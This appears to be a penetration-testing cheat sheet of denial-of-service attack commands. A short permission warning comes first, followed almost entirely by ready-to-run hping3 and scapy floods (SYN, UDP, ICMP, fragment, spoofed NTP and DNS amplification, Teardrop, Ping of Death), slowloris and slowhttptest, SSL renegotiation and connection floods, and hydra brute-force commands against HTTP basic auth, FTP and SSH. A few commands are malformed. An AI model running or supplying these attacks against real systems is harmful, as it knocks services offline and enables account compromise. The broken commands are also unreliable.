# 💣 DDoS

{% hint style="info" %}
**Distributed denial-of-service** attacks target **websites** and online **services**. The aim is to overwhelm them with more traffic than the server or network can accommodate.&#x20;

**The goal is to render the website or service inoperable.**
{% endhint %}

{% hint style="danger" %}
## ⚠️<mark style="color:red;">WARNING</mark>⚠️

* _<mark style="color:yellow;">Do not use these commands against any IP that you have not been given explicit permission to test. If used otherwise you may violate local laws, or at least ISP terms of service.</mark>_
* _<mark style="color:yellow;">Commands that employ spoofing might cause responses to active public IP(s). Make sure you are runing in an isolated lab environmen that cannot route out to the Internet, or employ filters to prevent responses from leaking out.</mark>_
* <mark style="color:yellow;">**It is assumed that the user of this document knows which services are open and what ports they are running on.**</mark>
* <mark style="color:yellow;">Items in</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">**< >**</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">brackets are parameters. Remove the brackets and enter the data specified</mark>
* <mark style="color:yellow;">In hping3 commands, remove the "--rand-source" for tests to use single source IP</mark>
* <mark style="color:yellow;">Scapy can be exited with a CTRL-D</mark>
{% endhint %}

## Attack commands

### TCP

```bash
# SYN Flood rate limited
hping3 -S -i u1000 -p $port $remote_IP

# SYN Flood rate limited, random IP
hping3 -S --rand-source -i u1 -p $port $remote_IP

# SYN Flood max
hping3 -S --rand-source --faster -p $port $remote_IP

# SYN and FIN set
hping3 -S -F --fast --rand-source -p $port $remote_IP

# SYN flood with large data
hping3 --verbose --syn --flood --win 65535 --ttl 64 --data 10000 --dontfrag --baseport 49877 --destport 80$remote_IP

# SYN flood with small data
hping3 --verbose --syn --flood --win 65535 --ttl 64 --data 100 --dontfrag --baseport 49877 --destport 80 $remote_IP

# SYN flood with PSH & URG set
hping3 --verbose --syn --push --urg --flood --win 65535 --ttl 64 --dontfrag --baseport 49877 --destport 80 $remote_IP

# SYN flood with ECN flag
hping3 --verbose --syn --xmas --flood --win 65535 --ttl 64 --dontfrag --baseport 49877 --destport 80 $remote_IP

# SYN flood with CWR flag
hping3 --verbose --syn --ymas --flood --win 65535 --ttl 64 --dontfrag --baseport 49877 --destport 80 $remote_IP

# SYN flood w/all flags set
hping3 --verbose --fin --syn --push --ack --urg --xmas --ymas --urg --flood --win 65535 --ttl 64 --dontfrag --baseport 49877 --destport 80 $remote_IP

# RST Flood max
hping3 -R --rand-source --faster -p $port $remote_IP

# TCP Packets without Flag
hping3 -i u1 --rand-source -p $port $remote_IP

# SYN-ACK Flood
hping3 -S -A --rand-source --fast -p $port $remote_IP

# Fast TCP port scan
nmap -sS -F $remote_IP

# FIN bit with no ACK bit
hping3 -F -i u1 --rand-source -p $port $remote_IP

# Incomplete & Duplicate Fragment flood
hping3   -P -A -i u1 --rand-source -p 80 -x -g 500 -m 1400 -d 1400 $remote_IP

# TCP packet anomaly (ttl is 0)
"#scapy
send(IP(dst=""$remote_IP"",ttl=0)/TCP(),count=5000)"

# Malformed TCP flood, no L4 data
"#scapy
send(IP(dst=""$remote_IP"",len=32)/TCP()/Raw(load=""malformed""),count=50000)"

# TCP full open socket flood; iptables rule blocks socket teardown
iptables -A OUTPUT -p tcp --tcp-flags FIN FIN -d $remote_IP -j DROP; nping --tcp-connect -p 80 --rate 50 --c 10000 -q $remote_IP
# After the test is complete, clean up with 
iptables -F
```

### IPV6 TCP

```bash
# IPv6 SYN-ACK flood random source
thcsyn6 -S -R -p x $interface $hostname $remote_port

# IPv6 SYN flood random source
thcsyn6 -R -p x $interface $hostname $remote_port
```

### UDP

```bash
# UDP Flood
hping3 -p <port> -i u1 --udp $remote_port

# Source/Dest port zero
hping3  --udp -i u1 --rand-source -s 0 -p 0 $remote_port

# Fragment Storm packet size 30 single source
hping3 -i u50 -d 30 -f -m 20 -0 -H 47 -a <src ip> $remote_port

# UDP flood with varying packet sizes
for (( i = 0; i <=500000; i++)); do hping3 -p $port --udp -c 1 -d `php -r "echo rand(0,1200);"` $remote_IP; done
# Note : Change the loop number to repeat as may times as desired. The (0,1200) indicates the min and max packet size values. These can be changed. If max is set too high, fragmentation may result (which may be intended!)

# SSDP reflection storm
hping3 --verbose --udp --flood --ttl 64 --baseport 6176 --destport 1900 --data 150 $remote_IP

# Fragment Storm packet size 2000
hping3 --udp -i u1 --rand-source -f -d 2000 -p $port $remote_IP

# Fragment Storm packet size 10000
hping3 --udp -i u1 --rand-source -f -d 10000 -p $port $remote_IP

# Invalid Fragment Offset
hping3 --udp --fragoff 1400 --rand-source -i u1 -p $port $remote_IP

# Fast UDP port scan
nmap -sU -F $remote_IP

# Malformed UDP flood, no L4 data
"#scapy
send(IP(dst=""$remote_IP"",len=32)/UDP()/Raw(load=""malformed""),count=50000)"

# Nestea Attack
"#scapy
send(IP(dst=$target, id=42, flags=""MF"")/UDP()/(""X""*10))
 send(IP(dst=$target, id=42, frag=48)/(""X""*116))
send(IP(dst=$target, id=42, flags=""MF"")/UDP()/(""X""*224))"
```

### NTP

```bash
# NTP amplification
hping3 --udp -i u1 --rand-source --baseport 123 --destport 123 -m 1400 -d 1400 $remote_IP

# NTP reflection
for (( i = 0; i <=500000; i++)); do ntpdc -n -c monlist $remote_IP; done
```

### DNS

```bash
# DNS Amplification
hping3 --udp $remote_IP -i u1 --rand-source --destport 53 -x -g 500 -m 1000 -d 1000 & hping3 --udp $remote_IP -i u1 --rand-source --destport 53

# DNS A Record Flood
"#scapy
send(IP(src=RandIP(),dst=""$remote_IP"")/UDP(sport=RandShort())/DNS(rd=1,qd=DNSQR(qname=""<domain name>"")),  loop=1)"
```

### IP

```bash
# Teardrop Attack
hping3  -f -i u1 --rand-source -S -p $port $remote_IP

# Unknown protocol
hping3 --rawip --ipproto 200 -i u1 --rand-source -p $port $remote_IP
```

### ICMP

```bash
# ICMP Flood
hping3 --i u1 --rand-source --icmp $remote_IP

# ICMP Fragment
hping3 -f --icmp -d 200 -i u1 --rand-source $remote_IP

# Ping of Death
"hping3 -s 66000 -F 1514 $remote_IP OR
#scapy
send( fragment(IP(dst=""10.0.0.5"")/ICMP()/(""X""*60000)) )"

# ICMP type 0
hping3 --verbose --icmp --icmpcode 0 --flood --ttl 64 --data 48 $remote_IP

# Unknown ICMP Type
hping3 --icmp --icmptype 36 --force-icmp --rand-source -i u1 $remote_IP

# ICMP Timestamp Request
hping3 --icmp --icmptype 13 --rand-source -i u1 $remote_IP

# ICMP Timestamp Reply
hping3 --icmp --icmptype 14 --rand-source -i u1 $remote_IP

# ICMP Mask Request
hping3 --icmp --icmptype 17 --rand-source -i u1 $remote_IP

# ICMP Mask Reply
hping3 --icmp --icmptype 18 --rand-source -i u1 $remote_IP
```

### ICMPv6

```bash
# Send random ICMPv6 types
randicmp6 $interface $destination_domain
```

### HTTP

```bash
# HTTP load generation
siege -b -i http://$url

# HTTP Scan
nikto -host http://$remote_ip_or_domain_name

# HTTP Post Flood (300 bytes random data)
for (( i = 0; i <=500000; i++)); do curl http://$remote_ip/ -d  `< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c 300`; done

# HTTP Get Flood (300 bytes random data)
for (( i = 0; i <=500000; i++)); do curl http://$remote_ip/ -G -d  `< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c 300`; done

# HTTP slow request (slowloris)
"(first time) wget http://ha.ckers.org/slowloris/slowloris.pl
./slowloris.pl $remote_ip -port 80 -num 500"

# HTTP slow headers
slowhttptest -H -c 10000 -g -/etc/log/slowloris-headers-statistics.html -i 10 -l 600 -r 200 -s 8192 -w 1 -y 1024 -x 10 -p 10 -u http://$remote_ip/

# HTTP slow post
slowhttptest -R -l 600 -p 10 -c 10000 -g -/etc/log/statistics.html -a 10 -b 3000 -r 500 -t HEAD -u http://$remote_ip
```

### HTTPS

```bash
# HTTPS login brute force attack on *basic* authentication page (not a web form)
hydra -l $username -P /usr/share/wordlists/sqlmap.txt -S $remote_ip http-get
# Remove the -S if page is not HTTPS
# Note : latest version of hydra requires square brackets around the IP addy.
```

### FTP

```bash
# FTP login brute force attack
hydra -l $username -P /usr/share/wordlists/sqlmap.txt ftp://$remote_ip
```

### SSH

```bash
# SSH login brute force attack
hydra -l $username -P /usr/share/wordlists/sqlmap.txt ssh://$remote_ip
```

### SSL

```bash
# SSL Renegotiation Attack
thc-ssl-dos $remote_ip 443

# SSL Request Flood
for (( i = 0; i <=500000; i++)); do openssl s_client -connect $remote_ip:443; done
```
